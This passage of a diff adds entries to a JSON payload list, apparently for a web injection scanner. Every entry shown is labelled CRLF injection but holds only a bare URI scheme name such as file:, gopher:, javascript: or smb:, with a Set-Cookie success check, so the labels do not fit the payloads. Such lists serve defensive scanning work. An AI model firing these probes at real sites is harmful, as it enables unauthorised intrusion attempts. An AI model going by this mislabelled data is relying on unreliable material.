+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393823",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "doi:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393824",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ed2k:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393825",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "facetime:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393826",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "fax:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393827",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "feed:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393828",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "file:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393829",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "finger:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393830",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "fish:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393831",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ftp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393832",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "geo:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393833",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gg:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393834",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "git:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393835",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gizmoproject:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393836",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "go:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393837",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393838",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gtalk:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393839",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "h323:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393840",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393841",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393842",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "iax:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393843",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "icap:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393844",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "im:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393845",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "imap:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393846",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "info:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393847",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ipp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393848",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "irc:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393849",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "irc6:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393850",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ircs:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393851",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "iris.beep:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393852",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "iris.lws:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393853",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "iris.xpcs:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393854",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "iris.xpc:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393855",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "iris:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393856",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "itms:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393857",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jar:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393858",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "javascript:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393859",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "keyparc:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393860",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "lastfm:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393861",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ldap:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393862",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ldaps:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393863",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "lsid:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393864",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "magnet:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393865",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "mailto:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393866",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "maps:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393867",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "market:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393868",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "message:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393869",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "mid:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393870",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "mms:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393871",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "modem:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393872",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "msnim:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393873",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "msrps:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393874",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "msrp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393875",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "mtqp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393876",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "mumble:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393877",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "mupdate:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393878",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "mvn:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393879",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "news:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393880",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "nfs:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393881",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "nntp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393882",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "notes:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393883",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "opaquelocktoken:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393884",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "palm:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393885",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "paparazzi:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393886",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "platform:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393887",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "pop:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393888",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "pres:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393889",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "prospero:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393890",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "proxy:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393891",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "psyc:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393892",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "query:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393893",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rmi:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393894",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rsync:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393895",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtmp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393896",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtsp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393897",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "secondlife:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393898",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "service:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393899",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sftp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393900",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sgn:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393901",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "shttp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393902",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sieve:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393903",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sip:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393904",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sips:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393905",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "skype:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393906",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "smb:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393907",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sms:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393908",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "snmp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393909",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "soap.beeps:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393910",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "soap.beep:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393911",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "soldat:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393912",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "spotify:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393913",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ssh:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393914",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "steam:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393915",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "svn:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393916",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "tag:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393917",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "teamspeak:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393918",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "tel:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393919",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "telnet:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393920",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "tftp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393921",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "things:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393922",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "thismessage:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393923",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "tip:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393924",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "tv:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393925",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "udp:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393926",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "unreal:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393927",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "urn:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393928",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ut2004:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Set-Cookie|injected"
+    }
+  },
+  {
+    "payload_id": "OWP-393929",
+    "vulnerability_category": "Injection (CRLF)",
+    "target_technology": "Generic",
